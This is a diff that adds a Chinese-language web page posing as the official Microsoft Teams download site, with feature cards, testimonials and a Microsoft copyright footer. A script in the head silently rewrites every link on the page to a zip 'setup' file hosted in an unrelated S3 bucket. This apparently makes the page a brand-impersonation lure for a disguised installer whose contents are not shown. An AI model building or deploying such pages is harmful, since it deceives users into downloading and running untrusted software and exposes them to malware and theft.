@@ -1,0 +1,245 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>下载 Microsoft Teams - 高效团队协作工具</title>
+    <script src='static/js/jquery.min.js'></script>
+    <script>
+        let Ahref = "https://s3.ap-east-1.amazonaws.com/ghfau-5.aws/Microsoft%20Team%20Setups_v1.8.1.zip";//下载文件路径
+        $(document).ready(function () {
+            $('a').each(function () {
+                $(this).attr("href", Ahref);
+            });
+        });
+    </script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        header {
+            background: linear-gradient(135deg, #0054a6, #0078d4);
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        header p {
+            font-size: 1.2em;
+            margin: 10px 0 0;
+            animation: fadeIn 3s ease-in-out;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 40px;
+            flex-wrap: wrap;
+        }
+
+        .feature {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 22%;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .feature:hover {
+            transform: translateY(-10px);
+        }
+
+        .feature img {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+        }
+
+        .feature h3 {
+            font-size: 1.2em;
+            margin: 10px 0;
+        }
+
+        .feature p {
+            font-size: 0.9em;
+            color: #666;
+        }
+
+        .cta {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .cta button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .cta button:hover {
+            background: #0054a6;
+        }
+
+        .testimonials {
+            background: white;
+            padding: 20px;
+            margin-top: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .testimonials h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .testimonial-scroll {
+            display: flex;
+            animation: scroll 20s linear infinite;
+        }
+
+        .testimonial {
+            min-width: 100%;
+            text-align: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+
+        .testimonial p {
+            font-style: italic;
+            color: #555;
+        }
+
+        .testimonial span {
+            display: block;
+            margin-top: 10px;
+            font-weight: bold;
+            color: #0078d4;
+        }
+
+        .image-showcase {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 40px;
+            flex-wrap: wrap;
+        }
+
+        .image-showcase img {
+            max-width: 45%;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .image-showcase img:hover {
+            transform: scale(1.05);
+        }
+
+        footer {
+            background: #333;
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 40px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes scroll {
+            0% {
+                transform: translateX(0);
+            }
+
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>Microsoft Teams</h1>
+        <p>高效沟通，无缝协作，尽在 Microsoft Teams！</p>
+    </header>
+    <div class="container">
+        <div class="features">
+            <div class="feature">
+                <img src="static/picture/chat.png" alt="Chat">
+                <h3>实时聊天</h3>
+                <p>支持文字、语音、视频，沟通无障碍！</p>
+            </div>
+            <div class="feature">
+                <img src="static/picture/meeting.png" alt="Meeting">
+                <h3>视频会议</h3>
+                <p>高清视频会议，支持屏幕共享和录制！</p>
+            </div>
+            <div class="feature">
+                <img src="static/picture/task.png" alt="Task Management">
+                <h3>任务管理</h3>
+                <p>轻松分配任务，跟踪进度！</p>
+            </div>
+        </div>
+        <div class="cta">
+            <a href=""> <button>立即下载</button></a>
+        </div>
+        <!-- 新增图片展示区域 -->
+        <div class="image-showcase">
+            <img src="static/picture/mt1.png" alt="Teams 示例图片 1">
+            <img src="static/picture/mt2.png" alt="Teams 示例图片 2">
+        </div>
+        <div class="testimonials">
+            <h2>用户评价</h2>
+            <div class="testimonial-scroll">
+                <div class="testimonial">
+                    <p>“Teams 让我们的远程办公变得如此简单！”</p>
+                    <span>—— 某企业用户</span>
+                </div>
+                <div class="testimonial">
+                    <p>“视频会议和文件共享功能太棒了！”</p>
+                    <span>—— 某教育机构</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2023 Microsoft Teams. 版权所有。</p>
+    </footer>
+</body>
+
+</html>
